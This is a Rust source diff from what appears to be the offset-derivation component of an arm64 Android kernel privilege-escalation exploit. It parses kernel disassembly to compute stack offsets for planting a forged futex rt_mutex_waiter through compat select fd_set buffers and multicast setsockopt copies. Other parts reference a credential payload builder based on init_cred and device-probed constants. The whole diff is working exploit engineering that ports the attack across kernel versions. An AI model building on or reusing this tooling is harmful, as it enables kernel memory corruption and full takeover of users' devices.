@@ -7,7 +7,8 @@ use regex::Regex;
 
 use crate::btf::Btf;
 use crate::disasm::{
-    add_sp_immediates, cmp_immediates, disassemble_range, first_sp_frame, has_direct_call,
+    add_sp_immediates, cmp_immediates, cmp_immediates_any_width, disassemble_range,
+    first_sp_frame, has_direct_call,
     is_mov_w0_wzr, is_mov_x1, materialized_address, validate_frame_live_at,
 };
 use crate::error::{ExtractError, Result};
@@ -338,16 +339,66 @@ fn sum_chain_frames(
     Ok(total)
 }
 
+/// Candidate copy lengths in `ip_setsockopt`: every `mov w2, #imm` that is
+/// preceded (within 8 lines) by a stack-buffer `add xN, sp, #off`. The
+/// multicast verdict uses these instead of the fixed 5.x group-request size,
+/// so a 6.x image with a different copy length is read from the image. The
+/// caller treats an empty set as unknown (or, for a no-BTF 5.10 image only, as
+/// the labelled 5.x fallback).
+pub fn multicast_copy_candidates(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted: &[u64],
+) -> Result<Vec<(&'static str, u64)>> {
+    let mut out = Vec::new();
+    // 5.x keeps the copy in `ip_setsockopt`; 6.x splits the option handlers
+    // into `do_ip_setsockopt`, which then owns the copy. Try both per image.
+    for name in ["ip_setsockopt", "do_ip_setsockopt"] {
+        let Ok(lines) = disassemble_symbol(kernel, symbols, sorted, name, OBJDUMP_CAP) else {
+            continue;
+        };
+        for size in copy_sizes_from_dis(&lines) {
+            out.push((name, size));
+        }
+    }
+    Ok(out)
+}
+
+fn copy_sizes_from_dis(lines: &[String]) -> Vec<u64> {
+    let mov = Regex::new(r"(?i)\bmov\s+w[23],\s*#0x([0-9a-f]+)\b").unwrap();
+    let add = Regex::new(r"(?i)\badd\s+x\d+,\s*sp,\s*#0x[0-9a-f]+").unwrap();
+    let mut sizes = Vec::new();
+    for (i, line) in lines.iter().enumerate() {
+        let Some(caps) = mov.captures(line) else {
+            continue;
+        };
+        let Ok(size) = u64::from_str_radix(&caps[1], 16) else {
+            continue;
+        };
+        let lo = i.saturating_sub(16);
+        if lines[lo..i].iter().any(|prev| add.is_match(prev)) {
+            sizes.push(size);
+        }
+    }
+    sizes.sort_unstable();
+    sizes.dedup();
+    sizes
+}
+
 /// The `add xN, sp, #off` feeding the `mov w2, #buffer_size` copy in
 /// `ip_setsockopt`: the multicast stamp window offset.
 fn greqs_offset_from_dis(lines: &[String], buffer_size: u64) -> Option<u64> {
-    let mov = Regex::new(&format!(r"(?i)\bmov\s+w2,\s*#0x{buffer_size:x}\b")).unwrap();
-    let add = Regex::new(r"(?i)\badd\s+x\d+,\s*sp,\s*#0x([0-9a-f]+)").unwrap();
+    let mov = Regex::new(&format!(r"(?i)\bmov\s+w[23],\s*#0x{buffer_size:x}\b")).unwrap();
+    // The destination argument of memset(greqs, 0, size) / copy_from*(greqs,
+    // ...) is x0. The 6.1 handler has other sp-relative adds in the window
+    // (e.g. another option's sp+0x120 buffer); matching x0 keeps the group
+    // request, not any stack buffer.
+    let add = Regex::new(r"(?i)\badd\s+x0,\s*sp,\s*#0x([0-9a-f]+)").unwrap();
     for (i, line) in lines.iter().enumerate() {
         if !mov.is_match(line) {
             continue;
         }
-        let lo = i.saturating_sub(8);
+        let lo = i.saturating_sub(16);
         for prev in lines[lo..i].iter().rev() {
             if let Some(caps) = add.captures(prev) {
                 return u64::from_str_radix(&caps[1], 16).ok();
@@ -391,11 +442,38 @@ pub fn multicast_waiter_off(
     pi_tree_entry: u64,
     lock_offset: u64,
 ) -> Result<McastWaiterGeometry> {
-    let setsockopt_frames = sum_chain_frames(kernel, symbols, sorted, SETSOCKOPT_CHAIN)?;
+    multicast_waiter_off_at(
+        kernel,
+        symbols,
+        sorted,
+        buffer_size,
+        pi_tree_entry,
+        lock_offset,
+        "ip_setsockopt",
+    )
+}
+
+/// Same geometry with the image's own copy function. 6.x splits the option
+/// handlers out of `ip_setsockopt` into `do_ip_setsockopt`, so the frame sum
+/// must include the function that owns the copy.
+pub(crate) fn multicast_waiter_off_at(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted: &[u64],
+    buffer_size: u64,
+    pi_tree_entry: u64,
+    lock_offset: u64,
+    copy_fn: &'static str,
+) -> Result<McastWaiterGeometry> {
+    let mut chain = SETSOCKOPT_CHAIN.to_vec();
+    if copy_fn != "ip_setsockopt" {
+        chain.push(copy_fn);
+    }
+    let setsockopt_frames = sum_chain_frames(kernel, symbols, sorted, &chain)?;
     let futex_frames = sum_chain_frames(kernel, symbols, sorted, FUTEX_CHAIN)?;
-    let ip = disassemble_symbol(kernel, symbols, sorted, "ip_setsockopt", OBJDUMP_CAP)?;
+    let ip = disassemble_symbol(kernel, symbols, sorted, copy_fn, OBJDUMP_CAP)?;
     let greqs = greqs_offset_from_dis(&ip, buffer_size)
-        .ok_or_else(|| ExtractError::new("ip_setsockopt multicast copy window not found"))?;
+        .ok_or_else(|| ExtractError::new(format!("{copy_fn} multicast copy window not found")))?;
     let fw = disassemble_symbol(
         kernel,
         symbols,
@@ -494,9 +572,9 @@ pub fn multicast_waiter_off(
 #[cfg(test)]
 mod tests {
     use super::{
-        fpsimd_copy_destination, multicast_geometry_5x, multicast_geometry_btf_only,
-        pselect_shift_from_delta, remove_waiter_uses_current, select_cred_caps, select_cred_refs,
-        sigreturn_offset,
+        compat_carrier_coverage, fpsimd_copy_destination, multicast_geometry_corroborated,
+        multicast_geometry_btf_only, pselect_shift_from_delta, remove_waiter_uses_current,
+        select_cred_caps, select_cred_refs, sigreturn_offset,
     };
     use std::collections::BTreeMap;
 
@@ -542,11 +620,11 @@ mod tests {
     }
 
     #[test]
-    fn multicast_geometry_uses_btf_offsets_and_the_proven_constants() {
+    fn multicast_train_fallback_uses_btf_offsets_and_the_probed_constants() {
         let mut structs: BTreeMap<String, Option<u32>> = BTreeMap::new();
         structs.insert("waiter_task".to_string(), Some(48));
         structs.insert("waiter_lock".to_string(), Some(56));
-        let geometry = multicast_geometry_5x(&structs);
+        let geometry = multicast_geometry_corroborated(&structs);
         assert_eq!(geometry.first(), Some(&("waiter_off", 96)));
         assert!(geometry.contains(&("task_offset", 48)));
         assert!(geometry.contains(&("lock_offset", 56)));
@@ -558,10 +636,48 @@ mod tests {
         assert!(geometry.contains(&("compact_waiter", 1)));
 
         let without: BTreeMap<String, Option<u32>> = BTreeMap::new();
-        let geometry = multicast_geometry_5x(&without);
+        let geometry = multicast_geometry_corroborated(&without);
         // No BTF: the 5.10 codegen layout fills task/lock.
         assert!(geometry.contains(&("task_offset", 0x30)));
         assert!(geometry.contains(&("lock_offset", 0x38)));
+    }
+
+    #[test]
+    fn compat_coverage_matches_the_measured_pairs() {
+        /* The six store images measure home 0x1b0 / dst 0x1e0 (time32) and the
+         * time64 alternative packs at 0x20. Both must pass. */
+        assert_eq!(
+            compat_carrier_coverage(0x1b0, 0x1e0),
+            Some(("futex_time32", 0x30))
+        );
+        assert_eq!(
+            compat_carrier_coverage(0x1c0, 0x1e0),
+            Some(("futex_time64", 0x20))
+        );
+    }
+
+    #[test]
+    fn compat_coverage_refuses_a_strip_deeper_than_the_buffer() {
+        /* 5.10.236: the compat strip lands at 0x200/0x210, deeper than the
+         * 0x1e0 _newselect buffer. */
+        assert_eq!(compat_carrier_coverage(0x200, 0x1e0), None);
+        assert_eq!(compat_carrier_coverage(0x210, 0x1e0), None);
+    }
+
+    #[test]
+    fn compat_coverage_refuses_an_unknown_home() {
+        /* The helper implements the futex_time32 (0x1b0) and futex_time64
+         * (0x1c0) entries only; any other derived home is a capability
+         * refusal, not a guess. */
+        assert_eq!(compat_carrier_coverage(0x1a8, 0x1e0), None);
+        assert_eq!(compat_carrier_coverage(0x1d0, 0x1e0), None);
+    }
+
+    #[test]
+    fn compat_coverage_requires_the_zero_tail_inside_res() {
+        /* With dst == home the res_* window sits below the stamp's zero tail,
+         * so the time32 stamp would rely on bytes the kernel never zeroes. */
+        assert_eq!(compat_carrier_coverage(0x1b0, 0x1b0), None);
     }
 
     #[test]
@@ -1166,22 +1282,25 @@ pub fn sigreturn_offset(off: i64) -> std::result::Result<u64, String> {
     Ok(off as u64)
 }
 
-/// The futex strip home: the depth of `futex_wait_requeue_pi`'s waiter local
-/// below the syscall entry (`Σ_futex − waiter_local`).
-fn futex_strip_home(
+/// The futex strip home for one entry wrapper: the depth of
+/// `futex_wait_requeue_pi`'s waiter local below the syscall entry
+/// (`Σ_futex − waiter_local`). The wrapper is a parameter because the 64-bit
+/// entry, the 32-bit `futex_time32` entry and the 32-bit `futex_time64` entry
+/// (which reuses the 64-bit wrapper) all feed the same `do_futex` chain.
+fn futex_chain_home(
     kernel: &[u8],
     symbols: &RelSymbols,
     sorted_offsets: &[u64],
-    pi_tree_entry: u64,
+    wrapper_name: &str,
+    wait_dis: &[String],
+    wait_addr: u64,
+    waiter_local: u64,
 ) -> Result<u64> {
-    let wrapper_name = "__arm64_sys_futex";
     let dispatch_name = "do_futex";
     let wait_name = "futex_wait_requeue_pi";
     let wrapper = disassemble_symbol(kernel, symbols, sorted_offsets, wrapper_name, OBJDUMP_CAP)?;
-    let wait = disassemble_symbol(kernel, symbols, sorted_offsets, wait_name, OBJDUMP_CAP)?;
-    let wait_addr = unique_offset(symbols, wait_name)?;
     let wrapper_frame = first_sp_frame(&wrapper, wrapper_name)?;
-    let wait_frame = first_sp_frame(&wait, wait_name)?;
+    let wait_frame = first_sp_frame(wait_dis, wait_name)?;
     let sum = if has_direct_call(&wrapper, wait_addr) {
         wrapper_frame
             .checked_add(wait_frame)
@@ -1199,10 +1318,251 @@ fn futex_strip_home(
             .and_then(|value| value.checked_add(wait_frame))
             .ok_or_else(|| ExtractError::new("futex chain overflow"))?
     };
-    let waiter_local = waiter_local_from_dis(&wait, pi_tree_entry)
-        .ok_or_else(|| ExtractError::new("futex_wait_requeue_pi waiter local not found"))?;
     sum.checked_sub(waiter_local)
         .ok_or_else(|| ExtractError::new("waiter local exceeds futex frames"))
+}
+
+/// The futex strip home of the 64-bit entry, with the waiter local derived
+/// from `futex_wait_requeue_pi` itself.
+fn futex_strip_home(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted_offsets: &[u64],
+    pi_tree_entry: u64,
+) -> Result<u64> {
+    let wait_name = "futex_wait_requeue_pi";
+    let wait = disassemble_symbol(kernel, symbols, sorted_offsets, wait_name, OBJDUMP_CAP)?;
+    let wait_addr = unique_offset(symbols, wait_name)?;
+    let waiter_local = waiter_local_from_dis(&wait, pi_tree_entry)
+        .ok_or_else(|| ExtractError::new("futex_wait_requeue_pi waiter local not found"))?;
+    futex_chain_home(
+        kernel,
+        symbols,
+        sorted_offsets,
+        "__arm64_sys_futex",
+        &wait,
+        wait_addr,
+        waiter_local,
+    )
+}
+
+/// The AArch32 compat select carrier's per-image geometry. Both halves come
+/// from the image's own code: the compat `_newselect` handler's fd_set buffer
+/// depth and the 32-bit futex entry's waiter strip home. No release family
+/// participates; an image without the compat symbols, with a waiter shape the
+/// carrier's stamp cannot represent, or whose depths do not cover the strip
+/// reports why instead.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct CompatCarrierLayout {
+    /// The strip home below the compat entry sp: 0x1b0 (futex_time32) or
+    /// 0x1c0 (futex_time64). Those are the two entries the armv7 helper
+    /// implements; any other derived home is a capability refusal.
+    pub waiter_home: u64,
+    /// The compat `_newselect` fd_set buffer's deepest byte (depth).
+    pub select_dst_depth: u64,
+    /// `select_dst_depth - waiter_home`: where the strip is packed.
+    pub offset: u64,
+    /// `futex_time32` or `futex_time64`; names the syscall entry the home was
+    /// derived from.
+    pub abi: &'static str,
+}
+
+/// The carrier's bitmap geometry, mirroring the app's packer: three 40-byte
+/// user sets at nfds 320, six kernel sets of the same size, the 5.x strip.
+pub const COMPAT_BITMAP_BYTES: u64 = 0x78;
+pub const COMPAT_SET_BYTES: u64 = 40;
+const COMPAT_TIME32_WORDS: u64 = 9;
+const COMPAT_TIME32_HOME: u64 = 0x1b0;
+const COMPAT_TIME64_HOME: u64 = 0x1c0;
+
+/// Pure coverage check: given the derived strip home and buffer depth, does
+/// the compat `_newselect` copy carry the stamp? The home selects the ABI the
+/// helper would call; the kernel's `res_*` zeroing covers the time32 stamp's
+/// last two words at depths `[dst-6set, dst-3set]`, the time64 stamp is
+/// user-copied whole.
+pub fn compat_carrier_coverage(home: u64, dst: u64) -> Option<(&'static str, u64)> {
+    if dst < home {
+        return None;
+    }
+    let offset = dst - home;
+    match home {
+        COMPAT_TIME32_HOME if offset + COMPAT_TIME32_WORDS * 8 <= COMPAT_BITMAP_BYTES => {
+            let tail_deepest = home as i64 - 0x48;
+            let tail_shallowest = home as i64 - 0x57;
+            let zero_deepest = dst as i64 - 6 * COMPAT_SET_BYTES as i64;
+            let zero_shallowest = dst as i64 - 3 * COMPAT_SET_BYTES as i64;
+            (tail_deepest <= zero_shallowest && tail_shallowest >= zero_deepest)
+                .then_some(("futex_time32", offset))
+        }
+        COMPAT_TIME64_HOME if offset + WAITER_STRIP_BYTES <= COMPAT_BITMAP_BYTES => {
+            Some(("futex_time64", offset))
+        }
+        _ => None,
+    }
+}
+
+/// Derive the compat carrier's geometry from the image:
+/// `__arm64_compat_sys_select -> do_compat_select -> compat_core_sys_select`
+/// gives the `_newselect` buffer depth; the 32-bit futex entries give the two
+/// candidate strip homes (`futex_time32`, and `futex_time64` reusing the
+/// 64-bit wrapper). The image's waiter must be the 5.x flat strip the
+/// carrier's stamp encodes (no `wake_state`).
+pub fn derive_compat_carrier_layout(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted_offsets: &[u64],
+    btf: Option<&Btf>,
+    kernel_major: Option<u32>,
+) -> Result<CompatCarrierLayout> {
+    let waiter = match btf {
+        Some(btf) => WaiterLayout::from_btf(btf)?,
+        None if kernel_major == Some(5) => crate::family::waiter_layout_5_10(),
+        None => {
+            return Err(ExtractError::new(
+                "compat carrier: no BTF and the no-BTF waiter template is 5.10-only",
+            ))
+        }
+    };
+    if waiter.wake_state.is_some() {
+        return Err(ExtractError::new(
+            "compat carrier: the image's waiter has a wake_state field; the carrier's \
+             stamp is the 5.x flat strip",
+        ));
+    }
+    let pi_tree = waiter.pi_tree_entry;
+
+    /* The compat `_newselect` chain and its fd_set buffer. Same shape as the
+     * 64-bit core_sys_select derivation: the buffer is the `add x, sp, #imm`
+     * immediate that is compared against a peer register, and the threshold
+     * proves nfds=320 stays on the 256-byte stack path. */
+    let mut select_dis: BTreeMap<&str, Vec<String>> = BTreeMap::new();
+    for (key, name) in [
+        ("wrapper", "__arm64_compat_sys_select"),
+        ("dispatch", "do_compat_select"),
+        ("core", "compat_core_sys_select"),
+    ] {
+        select_dis.insert(
+            key,
+            disassemble_symbol(kernel, symbols, sorted_offsets, name, OBJDUMP_CAP)?,
+        );
+    }
+    let core_addr = unique_offset(symbols, "compat_core_sys_select")?;
+    let dispatch_addr = unique_offset(symbols, "do_compat_select")?;
+    if !has_direct_call(&select_dis["wrapper"], dispatch_addr) {
+        return Err(ExtractError::new(
+            "__arm64_compat_sys_select does not directly call do_compat_select",
+        ));
+    }
+    if !has_direct_call(&select_dis["dispatch"], core_addr) {
+        return Err(ExtractError::new(
+            "do_compat_select does not directly call compat_core_sys_select",
+        ));
+    }
+    validate_frame_live_at(
+        &select_dis["wrapper"],
+        &Regex::new(&format!(r"(?i)\bbl\s+0x{dispatch_addr:x}\b")).unwrap(),
+        "__arm64_compat_sys_select",
+    )?;
+    validate_frame_live_at(
+        &select_dis["dispatch"],
+        &Regex::new(&format!(r"(?i)\bbl\s+0x{core_addr:x}\b")).unwrap(),
+        "do_compat_select",
+    )?;
+    let wrapper_frame = first_sp_frame(&select_dis["wrapper"], "__arm64_compat_sys_select")?;
+    let dispatch_frame = first_sp_frame(&select_dis["dispatch"], "do_compat_select")?;
+    let core_frame = first_sp_frame(&select_dis["core"], "compat_core_sys_select")?;
+    let select_frames = wrapper_frame
+        .checked_add(dispatch_frame)
+        .and_then(|sum| sum.checked_add(core_frame))
+        .ok_or_else(|| ExtractError::new("compat select chain overflow"))?;
+
+    let add_sp = add_sp_immediates(&select_dis["core"]);
+    let mut buffer_candidates: BTreeSet<u64> = BTreeSet::new();
+    for (reg, imm) in &add_sp {
+        let peers: Vec<&str> = add_sp
+            .iter()
+            .filter(|(peer, peer_imm)| peer_imm == imm && peer != reg)
+            .map(|(peer, _)| peer.as_str())
+            .collect();
+        let any_cmp = peers.iter().any(|peer| {
+            let re = Regex::new(&format!(r"(?i)\bcmp\s+{reg},\s*{peer}\b")).unwrap();
+            let re2 = Regex::new(&format!(r"(?i)\bcmp\s+{peer},\s*{reg}\b")).unwrap();
+            select_dis["core"]
+                .iter()
+                .any(|line| re.is_match(line) || re2.is_match(line))
+        });
+        if any_cmp {
+            buffer_candidates.insert(*imm);
+        }
+    }
+    if buffer_candidates.len() != 1 {
+        let hex: Vec<String> = buffer_candidates.iter().map(|v| format!("{v:#x}")).collect();
+        return Err(ExtractError::new(format!(
+            "compat_core_sys_select fd_set buffer candidates not unique: {hex:?}"
+        )));
+    }
+    let buffer = *buffer_candidates.iter().next().unwrap();
+    let fds_bytes = ((PSELECT_ROUTE_NFDS + 63) / 64) * 8;
+    let thresholds = cmp_immediates_any_width(&select_dis["core"]);
+    if !thresholds
+        .iter()
+        .any(|threshold| fds_bytes < *threshold && *threshold <= fds_bytes + 8)
+    {
+        return Err(ExtractError::new(format!(
+            "compat_core_sys_select threshold does not prove nfds={PSELECT_ROUTE_NFDS} \
+             uses the stack fd_set path"
+        )));
+    }
+    let select_dst_depth = select_frames
+        .checked_sub(buffer)
+        .ok_or_else(|| ExtractError::new("compat select buffer exceeds its frames"))?;
+
+    /* The two candidate strip homes from the image's own futex entries. */
+    let wait_name = "futex_wait_requeue_pi";
+    let wait_dis = disassemble_symbol(kernel, symbols, sorted_offsets, wait_name, OBJDUMP_CAP)?;
+    let wait_addr = unique_offset(symbols, wait_name)?;
+    let waiter_local = waiter_local_from_dis(&wait_dis, pi_tree)
+        .ok_or_else(|| ExtractError::new("futex_wait_requeue_pi waiter local not found"))?;
+    let time32_home = futex_chain_home(
+        kernel,
+        symbols,
+        sorted_offsets,
+        "__arm64_sys_futex_time32",
+        &wait_dis,
+        wait_addr,
+        waiter_local,
+    )?;
+    let time64_home = futex_chain_home(
+        kernel,
+        symbols,
+        sorted_offsets,
+        "__arm64_sys_futex",
+        &wait_dis,
+        wait_addr,
+        waiter_local,
+    )?;
+
+    let mut refused = Vec::new();
+    for (home, entry) in [
+        (time32_home, "futex_time32"),
+        (time64_home, "futex_time64"),
+    ] {
+        if let Some((abi, offset)) = compat_carrier_coverage(home, select_dst_depth) {
+            return Ok(CompatCarrierLayout {
+                waiter_home: home,
+                select_dst_depth,
+                offset,
+                abi,
+            });
+        }
+        refused.push(format!(
+            "{entry} home 0x{home:x} vs _newselect dst 0x{select_dst_depth:x} does not fit"
+        ));
+    }
+    Err(ExtractError::new(format!(
+        "compat carrier: {}",
+        refused.join("; ")
+    )))
 }
 
 /// Derive the sigreturn route's per-image geometry:
@@ -1518,10 +1878,21 @@ pub fn derive_nf_logger_registration(
 /// a route constant, not the image's `usage` value.
 pub const CRED_5X_USAGE_VALUE: u64 = 256;
 
-/// The proven 5.x multicast layout constants: `waiter_off` comes from the IPv4
-/// UDP `MCAST_BLOCK_SOURCE` probe.
-pub const MULTICAST_5X_WAITER_OFF: i64 = 96;
-pub const MULTICAST_5X_BUFFER_SIZE: i64 = 264;
+/// The multicast `waiter_off` measured on the A301SO hardware probe (IPv4 UDP
+/// `MCAST_BLOCK_SOURCE`). The extractor prefers the per-image derivation; this
+/// value is the labelled fallback for a feasible verdict whose numbers are
+/// incomplete, never a substitute for the derivation.
+pub const MULTICAST_PROBED_WAITER_OFF: i64 = 96;
+
+/// `sizeof(struct group_source_req)`: the setsockopt handler zeroes and copies
+/// exactly this UAPI buffer. A BTF-less image has no other source for the copy
+/// length, so the verdict records this ABI constant as the labelled fallback
+/// (`buffer_source = 1`). It is not a kernel-version fact.
+pub const GROUP_SOURCE_REQ_SIZE: i64 = 264;
+
+/// The multicast route's stamp is the flat (compact) waiter strip: the flag
+/// selects the native route implementation's encoder, not a kernel fact.
+pub const MULTICAST_COMPACT_WAITER: i64 = 1;
 
 /// Fields read from the real `init_cred`; the payload builder fills a private
 /// credential copy with them (`support/util.cpp::fill_profile_cred_copy`).
@@ -1662,28 +2033,29 @@ pub fn derive_cred_5x(btf: &Btf, kernel: &[u8], init_cred_off: u64) -> Result<Cr
     })
 }
 
-/// The train-corroborated 5.x multicast geometry: the frame/copy-window fields
-/// (`waiter_off`, `buffer_size`), the BTF-derived `rt_mutex_waiter` field
-/// offsets, and the compact-waiter flag. These hold across devices on the same
-/// train. A missing BTF value omits that key so the built-in profile can
-/// supply it.
+/// The train-corroborated multicast geometry: `waiter_off` from the hardware
+/// probe, the UAPI copy length, the `rt_mutex_waiter` field offsets, and the
+/// compact-waiter flag. This is a **fallback only**: the route block is built
+/// from the route verdict's image-derived numbers, and these values fill a key
+/// that a feasible verdict could not produce. A missing BTF value omits that
+/// key so the built-in profile can supply it.
 pub fn multicast_geometry_corroborated(
     structs: &BTreeMap<String, Option<u32>>,
 ) -> Vec<(&'static str, i64)> {
     let mut geometry: Vec<(&'static str, i64)> = vec![
-        ("waiter_off", MULTICAST_5X_WAITER_OFF),
-        ("buffer_size", MULTICAST_5X_BUFFER_SIZE),
+        ("waiter_off", MULTICAST_PROBED_WAITER_OFF),
+        ("buffer_size", GROUP_SOURCE_REQ_SIZE),
     ];
     geometry.extend(multicast_waiter_field_offsets(structs));
-    geometry.push(("compact_waiter", 1));
+    geometry.push(("compact_waiter", MULTICAST_COMPACT_WAITER));
     geometry
 }
 
 fn multicast_waiter_field_offsets(
     structs: &BTreeMap<String, Option<u32>>,
 ) -> Vec<(&'static str, i64)> {
-    // Without BTF (every 5.10 image) the waiter layout is the 5.10 codegen
-    // one: task 0x30, lock 0x38. The caller only emits 5.x geometry here.
+    // A BTF image supplies the offsets; without BTF the only template the
+    // extractor carries is the 5.10 codegen layout (task 0x30, lock 0x38).
     let fallback = crate::family::waiter_layout_5_10();
     let mut geometry: Vec<(&'static str, i64)> = Vec::new();
     if let Some(task) = structs
@@ -1705,17 +2077,10 @@ fn multicast_waiter_field_offsets(
     geometry
 }
 
-/// Full 5.x multicast geometry for the exact validated release. The forged
-/// object placement is no longer emitted (resident writer removed), so the
-/// geometry equals the train-corroborated set.
-pub fn multicast_geometry_5x(structs: &BTreeMap<String, Option<u32>>) -> Vec<(&'static str, i64)> {
-    multicast_geometry_corroborated(structs)
-}
-
-/// BTF-only part of the 5.x multicast geometry for releases with no verified
+/// BTF-only part of the multicast geometry for releases with no verified
 /// layout evidence: only what the image itself provides (`rt_mutex_waiter.task`
-/// / `.lock`). The proven Xperia constants are omitted on purpose so they are
-/// not mistaken for image-derived values.
+/// / `.lock`). The train fallback is omitted on purpose so it is not mistaken
+/// for an image-derived value.
 pub fn multicast_geometry_btf_only(
     structs: &BTreeMap<String, Option<u32>>,
 ) -> Vec<(&'static str, i64)> {
